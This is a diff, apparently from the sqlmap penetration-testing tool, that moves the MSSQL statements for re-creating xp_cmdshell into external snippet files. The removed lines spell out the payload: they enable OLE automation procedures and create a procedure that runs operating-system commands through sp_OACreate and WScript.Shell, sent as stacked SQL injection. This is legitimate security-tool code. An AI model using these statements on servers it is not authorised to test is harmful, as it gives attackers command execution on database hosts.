@@ -41,23 +41,14 @@ class xp_cmdshell:
         if Backend.isVersionWithin(("2005", "2008")):
             logger.debug("activating sp_OACreate")
 
-            cmd += "EXEC master..sp_configure 'show advanced options',1;"
-            cmd += "RECONFIGURE WITH OVERRIDE;"
-            cmd += "EXEC master..sp_configure 'ole automation procedures',1;"
-            cmd += "RECONFIGURE WITH OVERRIDE"
+            cmd = getSPQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
             inject.goStacked(agent.runAsDBMSUser(cmd))
 
         self.__randStr = randomStr(lowercase=True)
-        self.__xpCmdshellNew = randomStr(lowercase=True)
-        self.xpCmdshellStr = "master..xp_%s" % self.__xpCmdshellNew
+        self.__xpCmdshellNew = "xp_%s" % randomStr(lowercase=True)
+        self.xpCmdshellStr = "master..%s" % self.__xpCmdshellNew
 
-        cmd = "DECLARE @%s nvarchar(999);" % self.__randStr
-        cmd += "set @%s='" % self.__randStr
-        cmd += "CREATE PROCEDURE xp_%s(@cmd varchar(255)) AS DECLARE @ID int " % self.__xpCmdshellNew
-        cmd += "EXEC sp_OACreate ''WScript.Shell'',@ID OUT "
-        cmd += "EXEC sp_OAMethod @ID,''Run'',Null,@cmd,0,1 "
-        cmd += "EXEC sp_OADestroy @ID';"
-        cmd += "EXEC master..sp_executesql @%s" % self.__randStr
+        cmd = getSPQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self.__randStr, XP_CMDSHELL_NEW=self.__xpCmdshellNew)
 
         if Backend.isVersionWithin(("2005", "2008")):
             cmd += ";RECONFIGURE WITH OVERRIDE"
